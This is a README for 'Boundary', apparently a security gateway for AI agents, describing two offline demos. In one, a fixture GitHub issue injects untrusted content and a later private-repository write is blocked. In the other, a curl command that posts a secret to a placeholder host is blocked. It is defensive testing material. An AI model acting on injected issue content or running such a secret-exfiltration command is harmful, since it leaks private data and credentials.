# Boundary Demos

Boundary's public demo story is a two-lane proof spine, not a broad adapter
tour. Each lane is fixture-only, requires no credentials, makes no network
calls, performs no live mutation, and emits a decision record.

| Lane | Status | Command | Dangerous action | Success signal |
| --- | --- | --- | --- | --- |
| Lane 1 - MCP | Production route | `boundary demo github-lethal-trifecta` | Write-after-taint GitHub action | `actual=DENY`, `upstream_called=false`, `reason=lethal_trifecta_detected` |
| Lane 2 - Command Boundary | Delivered preview, routed-only | `boundary demo command-secret-exfil` | Routed secret-exfiltration command | `actual=DENY`, `executed=false`, `class=C6` |

![Two equal-weight Boundary proof lanes](./assets/two-lane-proof.svg)

## Run Both Lanes

```bash
boundary demo github-lethal-trifecta
boundary demo command-secret-exfil
```

To keep a verifiable decision-record file for each lane:

```bash
boundary demo github-lethal-trifecta --json --out demo.json
boundary demo command-secret-exfil --out demo.txt
boundary verify-record github-lethal-trifecta-artifacts/decision-record.json
boundary verify-record command-secret-exfil-artifacts/decision-record.json
```

`decision record path:` points to a single JSON object that
`boundary verify-record` consumes. `decision record log:` points to the
multi-record JSONL audit log written beside it.

## Lane 1 - MCP

`boundary demo github-lethal-trifecta` is the MCP production-route proof lane. A
fixture GitHub issue creates untrusted context, then a private-repository write
is denied before upstream GitHub execution.

Read the lane detail:
[DEMO_GITHUB_LETHAL_TRIFECTA.md](./DEMO_GITHUB_LETHAL_TRIFECTA.md).

## Lane 2 - Command Boundary

`boundary demo command-secret-exfil` is the Command Boundary delivered-preview
proof lane. A routed `curl -d [redacted] https://example.invalid` command is
classified as secret exfiltration and denied before execution.

Read the lane detail:
[command-boundary/DEMO.md](./command-boundary/DEMO.md).

## What These Demos Prove

- Boundary can deny the two tested dangerous action patterns when the route is
  forced through Boundary.
- The MCP lane can deny write-after-taint before upstream execution.
- The Command Boundary lane can deny a routed command before local execution.
- Both lanes emit a hash-verifiable decision record for the governed verdict.

## What They Do Not Prove

- They do not prove every malicious prompt is blocked.
- They do not prove protection for direct, unrouted tool access.
- They do not prove production deployment bypass resistance.
- They do not promote Command Boundary, Edit Boundary, Secure GitHub, or any
  other preview surface to production.
- They do not make live network calls or mutate real systems.
